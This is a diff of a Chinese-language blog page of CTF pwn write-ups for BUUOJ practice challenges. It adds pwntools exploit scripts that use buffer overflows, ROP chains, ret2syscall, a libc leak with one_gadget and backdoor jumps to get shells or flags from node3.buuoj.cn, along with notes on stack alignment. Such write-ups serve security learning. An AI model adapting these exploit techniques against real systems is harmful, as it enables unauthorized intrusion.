@@ -420,7 +420,7 @@
 
 <blockquote>
 <p>这里唯一要说的就是最后一个payload的+p64(ret_addr)，里面只有一个return语句，目的是为了平衡堆栈，并且这应该是ubuntu18的毛病，在kali下打本地不要这句也可以拿到shell。</p>
-<p>和<a href="ld1ng.com">ld1ng</a>讨论了一下(主要是鼎哥单方面教我)，大概是因为（猜测，没有证实）两次返回了同一个函数（这里是main函数），第一个payload因为+p64(rdi_addr)，所以多了一个pop，导致栈向下移了8个字节，而ubuntu18规定必须16个字节对齐，所以需要用一个ret来对齐，经过测试这里只要是奇数个ret都是可以的，因为都满足了栈对齐。</p>
+<p>和<a href="ld1ng.com">ld1ng</a>讨论了一下(说是讨论，其实是鼎哥单方面教我)，大概是因为（猜测，没有证实）两次返回了同一个函数（这里是main函数），第一个payload因为+p64(rdi_addr)，所以多了一个pop，导致栈向下移了8个字节，而ubuntu18规定必须16个字节对齐，所以需要用一个ret来对齐，经过测试这里只要是奇数个ret都是可以的，因为都满足了栈对齐。</p>
 </blockquote>
 <h3 id="OGeek2019-babyrop-buuoj"><a href="#OGeek2019-babyrop-buuoj" class="headerlink" title="[OGeek2019]babyrop - - buuoj"></a>[OGeek2019]babyrop - - buuoj</h3><p>关键判断：</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf_len = <span class="built_in">strlen</span>(buf);						  <span class="comment">//strlen遇到字符串'\x0'截至</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, buf_len) )              <span class="comment">// 比较前buf_len个字节，如果buf_len为0则可绕过</span></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
@@ -443,6 +443,7 @@
 
 
 <h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>吐了，弄了一会ret2libc没有做出来，第二次返回到main的时候总是说too long，一查题解发现给了后门，无话可说。。。。。。。</p>
+<p>只能说这波是老盲星了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./r2t3'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"26861"</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.29_32.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./r2t3'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_addr = 0x8048760</span></span><br><span class="line"><span class="comment"># payload = 0x15 * 'a' + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(260,'a')</span></span><br><span class="line"><span class="comment"># sh.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_addr = u32(sh.recv(4))</span></span><br><span class="line"><span class="comment"># base = puts_addr - libc.sym['puts']</span></span><br><span class="line"><span class="comment"># sys_addr = base + libc.sym['system']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.recvuntil('name:')</span></span><br><span class="line">payload = <span class="number">0x15</span> * <span class="string">'a'</span> + p32(<span class="number">0x0804858B</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -460,6 +461,56 @@
 <p><a href="https://blog.csdn.net/fjh1997/article/details/105347161" target="_blank" rel="noopener">解决一种pwn本地打不通远程打得通的问题</a></p>
 <p><a href="https://blog.csdn.net/fjh1997/article/details/107695261" target="_blank" rel="noopener">关于jarvisOJ level0远程打得通本地打不通的问题</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ds'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"27757"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ds'</span>)</span><br><span class="line">eax_addr = <span class="number">0x080b91e6</span> </span><br><span class="line">edcb_addr = <span class="number">0x0806fc30</span></span><br><span class="line">gets_plt = <span class="number">0x0804F630</span></span><br><span class="line"><span class="comment">#read_plt = elf.plt['read']</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">print(hex(bss_addr))</span><br><span class="line">int80_addr = <span class="number">0x0806d7e5</span> </span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="number">0x38</span> * <span class="string">'a'</span> + p32(gets_plt) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">payload = <span class="number">0x38</span> * <span class="string">'a'</span> + p32(eax_addr) + p32(<span class="number">0xb</span>) + p32(edcb_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(int80_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><p>注意是int，所以如果按照习惯填充’a’的话记得乘以四。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ciscn_2019_n_8'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">'26238'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">13</span> * <span class="number">4</span> + p32(<span class="number">17</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>题目留了后门函数get_secret，后门函数将flag写在了bss段上，那只要控制程序流程先执行后门函数再通过write函数将flag打印就可以了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">'26664'</span>)</span><br><span class="line">flag_addr = <span class="number">0x080489A0</span></span><br><span class="line">bss_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x2d</span> * <span class="string">'a'</span> + p32(flag_addr) + p32(write_addr) + p32(<span class="number">1</span>) + p32(<span class="number">1</span>) + p32(bss_addr) + p32(<span class="number">45</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">flag = sh.recv()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h3><p>刚拿到题目看到保护全开直接吓尿了，换完裤子之后仍然一头雾水，然后我他妈直接开始搜题解。这里用到了one_gadget，一个只要满足条件就可以拿shell的好东西，具体就不多说了，网上都有。</p>
+<p><a href="https://bbs.pediy.com/thread-261112.htm" target="_blank" rel="noopener">pwn中one_gadget的使用技巧</a></p>
+<p>另外说一下为什么把gadget打过去就可以直接拿到shell了，网上的教程我翻了一下都是很有默契的跳过了这部分。</p>
+<ul>
+<li><strong>首先是满足one_gadget的条件：</strong></li>
+</ul>
+<p>根据题目提供的Libc查看one_gadget:</p>
+<p><img src="https://i.loli.net/2020/10/07/u8RvOdQZqAwN3JY.png" alt="image-20201007195646212"></p>
+<p>这里记录一下查看第四个的过程，前面三个试了下不太行，不知道是不是我操作问题，因为开启了PIE是没法直接下地址的，然后下函数的断点又报错，只能直接开跑然后看状态了，但是因为会错误退出所以我觉得也问题不大，大不了达成条件的时候用手段构造一下。</p>
+<p>gdb直接运行，然后输入，然后就自动停了。</p>
+<p><img src="https://i.loli.net/2020/10/07/DgqEoSV73zpyhub.png" alt="image-20201007200030263"></p>
+<ul>
+<li><strong>为什么打过去就有权限</strong></li>
+</ul>
+<p>ok那现在知道了第四个gadget是满足条件的，那为什么把gadget打过去就能拿到权限呢，毕竟反汇编代码可是这样的：</p>
+<p><img src="https://i.loli.net/2020/10/07/jR4PDUzS1gdsZev.png" alt="image-20201007200229799"></p>
+<p>其实看到这种代码，心里大概就有个数了，八成是IDA犯病了，我他妈直接看汇编。</p>
+<p><img src="https://i.loli.net/2020/10/07/rg1Ex9NnQXKSF8d.png" alt="image-20201007200422351"></p>
+<p>好的那现在只差最后一步打过去了。</p>
+<ul>
+<li><strong>为什么是str()不是p64()</strong></li>
+</ul>
+<p>因为我自己写exp的时候习惯性就用了p64()，然后打不通，我猜测是因为scanf把，这里是把输入直接放到了rdx里面然后call了，所以得用str()打过去吧。那为什么不直接打int呢？报错：AttributeError: ‘int’ object has no attribute ‘encode’</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">'libc-2.29.so'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">'27543'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">printf_addr = int(sh.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="comment">#ibc = LibcSearcher("printf",printf_addr)</span></span><br><span class="line">base = printf_addr - libc.sym[<span class="string">"printf"</span>]</span><br><span class="line">gadget_addr = base + <span class="number">0x106ef8</span></span><br><span class="line">sh.sendline(str(gadget_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p>白给，这题放这里就离谱</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">'27813'</span>)</span><br><span class="line">payload = (<span class="number">0x88</span> + <span class="number">4</span>) * <span class="string">'a'</span> + p32(<span class="number">0x08048320</span>) +p32(<span class="number">0x1</span>) + p32(<span class="number">0X0804A024</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
           
@@ -534,10 +585,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-04T01:24:00+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-07T21:20:15+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>最后更新于：Oct 4, 2020</p>
+    <p>最后更新于：Oct 7, 2020</p>
   </a>
 </div>
 
@@ -617,7 +668,9 @@
                 <p class='content'>encyypto&amp;&amp;decrypto
 
 
-写在前面的话</p>
+写在前面的话我也不知道写啥，直接开冲吧。
+RSAROLL一道入门RSA，那为什么记录呢，为了记录一下python语法（/笑哭）😂
+12...</p>
               </a>
             
             
@@ -699,7 +752,7 @@ basic rop64位传参
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-c-1-buuoj"><span class="toc-text">ciscn_2019_c_1 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OGeek2019-babyrop-buuoj"><span class="toc-text">[OGeek2019]babyrop - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level0-buuoj"><span class="toc-text">jarvisoj_level0 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第五空间2019-决赛-PWN5-buuoj"><span class="toc-text">[第五空间2019 决赛]PWN5 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-started-3dsctf-2016"><span class="toc-text">get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-started-3dsctf-2016-1"><span class="toc-text">get_started_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法一exp-backdoor"><span class="toc-text">方法一exp_backdoor:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法二exp-ret2syscall"><span class="toc-text">方法二exp_ret2syscall:</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-c-1-buuoj"><span class="toc-text">ciscn_2019_c_1 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OGeek2019-babyrop-buuoj"><span class="toc-text">[OGeek2019]babyrop - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level0-buuoj"><span class="toc-text">jarvisoj_level0 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第五空间2019-决赛-PWN5-buuoj"><span class="toc-text">[第五空间2019 决赛]PWN5 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-started-3dsctf-2016"><span class="toc-text">get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-started-3dsctf-2016-1"><span class="toc-text">get_started_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法一exp-backdoor"><span class="toc-text">方法一exp_backdoor:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法二exp-ret2syscall"><span class="toc-text">方法二exp_ret2syscall:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-text">ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-text">not_the_same_3dsctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-one-gadget"><span class="toc-text">[BJDCTF 2nd]one_gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-text">jarvisoj_level2</span></a></li></ol>
     </div>
   </section>
 
